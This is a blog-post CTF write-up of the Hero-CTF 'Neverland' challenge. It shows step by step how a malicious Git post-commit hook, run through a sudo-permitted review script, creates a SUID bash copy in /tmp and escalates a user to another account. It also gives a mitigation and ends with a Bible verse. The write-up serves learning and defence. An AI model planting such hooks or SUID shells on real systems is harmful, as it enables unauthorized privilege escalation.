# Git Hook Privilege Escalation — Hero-CTF Write‑Up

📝 Executive Summary

---

### Git Hook Privilege Escalation — Hero-CTF Write‑Up

![](https://cdn-images-1.medium.com/max/800/1*A1hVYZqBzlpBXTR5JhOiYg.jpeg)

<a href="https://medium.com/system-weakness/git-hook-privilege-escalation-hero-ctf-write-up-b40300dc0e4a?sk=44cd5f1cd39f72a6043eb0251e3eeef6" class="markup--anchor markup--p-anchor" data-href="https://medium.com/system-weakness/git-hook-privilege-escalation-hero-ctf-write-up-b40300dc0e4a?sk=44cd5f1cd39f72a6043eb0251e3eeef6" target="_blank">**NOT A MEMBER?? CLICK HERE TO READ THE FULL STORY!!**</a>

### 📝 Executive Summary

This report details the successful exploitation of a Local Privilege Escalation (LPE) vulnerability found in the administrative environment of the Hero-CTF challenge. The flaw resided in the `/opt/commit.sh` script, which was permitted to run with the elevated privileges of the user **`peter`** via `sudo`. The script processed user-submitted Git repositories but failed to sanitize the included **Git hooks**. By injecting a malicious `post-commit` hook into the submitted archive, the non-privileged user **`intern`** was able to execute arbitrary commands as **`peter`** when the script performed a `git commit` operation.

The exploitation was achieved by crafting a `post-commit` hook that created a **Set User ID (SUID)** copy of the shell binary `/bin/bash` in the `/tmp` directory. This SUID binary granted the `intern` user an effective user ID (EUID) of `peter`, thereby bypassing the intended privilege separation. This attack vector highlights a critical security gap in automated workflows that handle untrusted user input with elevated privileges. The vulnerability could have been mitigated by disabling or stripping all user-defined hooks before running Git operations in the privileged context.

### **Challenge/CTF Details**

> **I spent this entire CTF on one “easy” challenge.**

> And honestly? I learned more doing that than I ever have while chasing points. This write-up is the first in a new series documenting my journey to master the fundamentals of CTFs.

> Instead of rushing to the finish line, I’m slowing down to document the *why* and *how* behind every flag. If you want to follow along as I build my skills from the ground up, follow this series! Drop a comment below with what you’re currently learning — let’s grow together. also if there is anything in particular you would like me to solve or to write up for you drop me a comment!

> **Team Name:** VoxSec

> **User Name**: K70n0s510

> **Challenge Name:** Neverland

> **Category:** Privilege Escalation / Misc/ DevOps

> **Vulnerability Type:** Git Hook Injection / LPE

> **Points:** 50

> **Difficulty Rating:** Easy

> **Operating System:** Linux (Debian)

> **Objective:**

• Escalate privileges from the low‑privileged user intern to the administrative user peter.\
• Exploit a flawed Git review script (/opt/commit.sh) that runs with elevated privileges.

![](https://cdn-images-1.medium.com/max/800/1*uhtqM-lyn028NgXTj2zhOg.jpeg)

### **Reconnaissance**

• Current user: intern\
• Target user: peter\
• Privilege check:

```
sudo -l
```

- <span id="343c">Output showed that intern could run /opt/commit.sh as peter without a password.</span>

#### **Vulnerability Analysis**

• The script accepts a user‑supplied Git repository archive (.tar.gz)\
• It extracts the archive into a temporary directory\
• It runs Git operations, including git commit\
• The script does not sanitize or disable Git hooks inside .git/hooks\
• **Result:** any malicious hook in the submitted repo executes with peter’s privileges

#### **Exploitation Strategy**

• Inject a malicious post‑commit hook that creates a Set User ID **(SUID)** copy of **/bin/bash** in **/tmp**\
• This **SUID** shell allows intern to run commands with peter’s effective privileges

![](https://cdn-images-1.medium.com/max/800/1*oOTECu-rv67y9Kncy7RAew.jpeg)

> **Malicious Hook**

```
#!/bin/sh
cp /bin/bash /tmp/shell
chmod u+s /tmp/shell
```

### **Execution Steps**

- <span id="ab6f">Clean up and copy the official repo to satisfy commit history checks:</span>

```
rm -rf exploit-repo
cp -r /app exploit-repo
cd exploit-repo
```

- <span id="ee69">Inject the malicious hook:</span>

```
cat > .git/hooks/post-commit << 'EOF'
#!/bin/sh
cp /bin/bash /tmp/shell
chmod u+s /tmp/shell
EOF
chmod +x .git/hooks/post-commit
```

- <span id="ede8">Package the repository:</span>

```
cd ..
tar -czf exploit.tar.gz exploit-repo
```

• Trigger the vulnerable script:

> **Privilege Escalation**

• Execute the SUID shell:

```
/tmp/shell -p
id
```

- <span id="de63">Output confirmed:\
   • **uid = intern\
   • euid = peter**</span>

### **Flag Capture**

• Navigate to peter’s home directory:

```
ls -la /home/peter
cat /home/peter/flag.txt
```

- <span id="5b98">Flag retrieved:</span>

```
Hero{c4r3full_w1th_g1t_hO0k5_d4dcefb250aa8XXXXXXXXXXX}
```

![](https://cdn-images-1.medium.com/max/800/1*51LoD62Gz7_UNO4hu0jTsQ.jpeg)

> **Key Takeaways**

#### **What I Learned**

Through this challenge I learned how small oversights in everyday scripts can lead to serious security risks. By exploiting Git hooks, I gained hands‑on experience with privilege escalation and reinforced the importance of secure coding practices. It showed me how attackers think creatively about “normal” developer tools and how defenders need to anticipate those moves. Git hooks can be weaponized if not sanitized in administrative workflows, which makes this lesson directly relevant to real‑world development environments.

I also learned the value of persistence and methodical problem‑solving. The exploit required me to carefully test, adjust, and document each step until the vulnerability was successfully triggered. That process mirrors real‑world troubleshooting, where patience and clear documentation are just as important as technical skill. Always validate and strip hooks from user‑supplied repositories before running privileged Git commands — this simple safeguard could have prevented the escalation entirely.

Finally, this event taught me how to turn technical findings into clear, structured communication. Writing the case study helped me practice explaining complex exploits in a way that recruiters, managers, and non‑technical stakeholders can understand. This challenge demonstrates practical Local Privilege Escalation (LPE) through Git internals, and it reinforced that cybersecurity isn’t just about breaking systems — it’s about showing impact, sharing lessons, and building trust with the people who rely on those systems

### 🕊️ The Call to Now

### ***“For he says, ‘In the time of my favor I heard you, and in the day of salvation I helped you.’ I tell you, now is the time of God’s favor, now is the day of salvation.” ****— ****2 Corinthians 6:2**** (NIV)*

### What This Means

- <span id="c404">**For Faith:** This verse is a direct and encouraging command to **act now.** It firmly states that the door to faith, forgiveness, and transformation is wide open in the present moment. There’s no reason to delay seeking God’s favor or starting the journey back to faith.</span>

> ***God Bless you all! Amen.***

### CONTACT INFO

- <span id="0247">Discord= <a href="https://discord.gg/We99mDNE" class="markup--anchor markup--li-anchor" data-href="https://discord.gg/We99mDNE" rel="noopener ugc nofollow noopener" target="_blank">HTB/CTF Study Server</a></span>
- <span id="7d5e">Linkedin=<a href="http://www.linkedin.com/in/nick-mullenski-9a5980367" class="markup--anchor markup--li-anchor" data-href="http://www.linkedin.com/in/nick-mullenski-9a5980367" rel="noopener ugc nofollow noopener" target="_blank">www.linkedin.com/in/nick-mullenski-9a5980367</a></span>
- <span id="a583">HTB-CTF-Team=Kr0nos510</span>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [December 1, 2025](https://medium.com/p/b40300dc0e4a).

<a href="https://medium.com/@nicholasmullenski/git-hook-privilege-escalation-hero-ctf-write-up-b40300dc0e4a" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
